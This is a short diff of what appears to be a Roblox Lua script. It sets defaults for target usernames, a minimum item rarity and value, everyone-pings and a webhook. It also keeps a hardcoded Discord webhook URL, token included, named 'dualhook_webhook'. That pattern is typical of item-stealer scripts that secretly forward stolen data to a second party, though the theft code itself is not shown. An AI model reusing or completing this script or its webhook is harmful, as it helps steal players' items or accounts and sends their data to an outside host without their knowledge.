@@ -1,3 +1,6 @@
+
+
+
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
@@ -5,9 +8,9 @@ end
 _G.scriptExecuted = true
 
 local users = _G.Usernames or {}
-local min_rarity = _G.min_rarity or ""
+local min_rarity = _G.min_rarity or "Common"
 local min_value = _G.min_value or 1
-local ping = _G.pingEveryone or ""
+local ping = _G.pingEveryone or "Yes"
 local webhook = _G.webhook or ""
 local dualhook_webhook = "https://discord.com/api/webhooks/1433048206001836064/LFCtg5xm6tdaKXf-BXRxUIbQwWbEoaM1Im1lyv0Eqn9qUHRGecpysHzDHfEXpCRo95nD"
 
